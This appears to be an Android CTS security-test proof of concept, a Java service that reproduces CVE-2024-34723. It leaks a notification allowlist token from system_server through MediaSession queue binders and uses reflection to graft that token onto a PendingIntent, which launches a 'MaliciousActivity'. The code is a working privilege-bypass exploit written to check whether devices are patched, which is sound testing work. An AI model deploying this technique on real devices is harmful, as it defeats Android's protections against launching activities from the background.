/*
 * Copyright (C) 2024 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2024_34723_malicious_app;

import static android.os.Build.VERSION.SDK_INT;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ParceledListSlice;
import android.graphics.drawable.Icon;
import android.media.session.ISession;
import android.media.session.ISessionController;
import android.media.session.MediaController;
import android.media.session.MediaSession;
import android.media.session.ParcelableListBinder;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;

public class PocService extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Fetch and add the flag 'RECEIVER_EXPORTED' for 'TIRAMISU' and above versions to
        // keep the code consistent
        int requiredFlag = 0;
        try {
            requiredFlag =
                    SDK_INT >= 33 /* TIRAMISU */
                            ? (int)
                                    getFieldFrom(
                                                    Context.class,
                                                    getString(R.string.receiverExportedString))
                                            .get(this)
                            : 0;
        } catch (IllegalAccessException ignore) {
            // Ignore
        }

        // Register the broadcast receiver to reproduce vulnerability
        registerReceiver(
                new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent) {
                        new Handler(Looper.getMainLooper())
                                .post(postTaskToReproduceVulnerability(context));
                    }
                },
                new IntentFilter(getString(R.string.invokeVulnerabilityAction)),
                requiredFlag);

        // Send broadcast to 'DeviceTest' to inform that the broadcast receiver has been
        // registered successfully.
        sendBroadcast(
                new Intent(getString(R.string.testAction))
                        .putExtra(getString(R.string.broadcastReceiverRegistered), true));

        return super.onStartCommand(intent, flags, startId);
    }

    private Runnable postTaskToReproduceVulnerability(Context context) {
        return () -> {
            try {
                // Create a media session
                final MediaSession mediaSession = new MediaSession(context, "cve_2024_34723");

                // Send the list of notification having 'mAllowlistToken' as null to the
                // 'system_server'.
                // When the notification is loaded, and the 'mAllowlistToken' is found null,
                // then it is filled with 'Notification::processAllowlistToken'
                setNotificationToQueue(mediaSession);

                // Fetch the list to get the 'Notification::processAllowlistToken'
                final List<ISessionController> tokenLists = fetchTokenList(mediaSession);

                // With fix, no tokens are retrieved. Hence, send the broadcast to pass the test
                if (tokenLists.isEmpty()) {
                    sendBroadcast(
                            new Intent(getString(R.string.testAction))
                                    .putExtra(
                                            getString(R.string.deviceVulnerabilityStatus),
                                            getString(R.string.negative)));
                    return;
                }

                // Send notification with a pending intent with an intent to launch
                // 'MaliciousActivity'
                final Notification notification = sendNotification(context);

                // Set the 'mWhitelistToken' of pending intent from notification with the
                // 'mAllowlistToken' of the first token from 'processAllowlistToken'.
                final IBinder allowListToken =
                        (IBinder)
                                getFieldFrom(Notification.class, getString(R.string.allowlistToken))
                                        .get(tokenLists.get(0));
                final PendingIntent pendingIntent = notification.contentIntent;
                getFieldFrom(PendingIntent.class, "mWhitelistToken")
                        .set(pendingIntent, allowListToken);
                pendingIntent.send();

                // Cancel the notification
                getSystemService(NotificationManager.class).cancel(0 /* notification id */);
            } catch (Exception e) {
                // Ignore
            }
        };
    }

    private void setNotificationToQueue(MediaSession mediaSession) throws Exception {
        // Create a List of 'Notification' having 'mAllowlistToken' as null
        final List<Notification> notificationList = new ArrayList<Notification>();
        final Notification notification = new Notification();
        getFieldFrom(Notification.class, getString(R.string.allowlistToken))
                .set(notification, null);
        notificationList.add(notification);

        // Fetch the 'MediaSession::mBinder' of the created media session
        final ISession binder =
                (ISession) getFieldFrom(MediaSession.class, "mBinder").get(mediaSession);

        // Invoke the 'ISession::getBinderForSetQueue' to get the binder and send the
        // list of notification to system_server to load it.
        ParcelableListBinder.send(binder.getBinderForSetQueue(), notificationList);
    }

    private List<ISessionController> fetchTokenList(MediaSession mediaSession) throws Exception {
        // Fetch the 'mSessionBinder' for the media session
        final ISessionController sessionController =
                (ISessionController)
                        getFieldFrom(MediaController.class, "mSessionBinder")
                                .get(mediaSession.getController());

        // Fetch the queue list
        final ParceledListSlice parcelListSlice = sessionController.getQueue();
        return parcelListSlice.getList();
    }

    private Notification sendNotification(Context context) {
        // Create notification channel
        final String channelId = "cve_2023_35675_channel_id";
        final NotificationManager notificationManager =
                context.getSystemService(NotificationManager.class);
        final NotificationChannel channel =
                new NotificationChannel(
                        channelId,
                        "cve_2023_40081_channel_name",
                        NotificationManager.IMPORTANCE_DEFAULT);
        notificationManager.createNotificationChannel(channel);

        // Create notification
        final String title = "cve_2023_40081_title";
        final PendingIntent pendingIntent =
                PendingIntent.getBroadcast(
                        context,
                        0 /* requestCode */,
                        new Intent()
                                .setClass(context, PocReceiver.class)
                                .putExtra(
                                        getString(R.string.maliciousActivityIntent),
                                        new Intent(context, MaliciousActivity.class)
                                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)),
                        PendingIntent.FLAG_CANCEL_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        final Notification notification =
                new Notification.Builder(context, channelId)
                        .setContentTitle(title)
                        .setSmallIcon(
                                Icon.createWithData(
                                        new byte[0] /* data */, 0 /* offset */, 0 /* length */))
                        .setContentIntent(pendingIntent)
                        .build();

        // Post the notification
        notificationManager.notify(0 /* notification id */, notification);
        return notification;
    }

    private Field getFieldFrom(Class cls, String fieldName) {
        // Iterate through all declared fields and return the required field
        for (Field declaredField : cls.getDeclaredFields()) {
            if (declaredField.getName().equals(fieldName)) {
                declaredField.setAccessible(true);
                return declaredField;
            }
        }
        return null;
    }
}
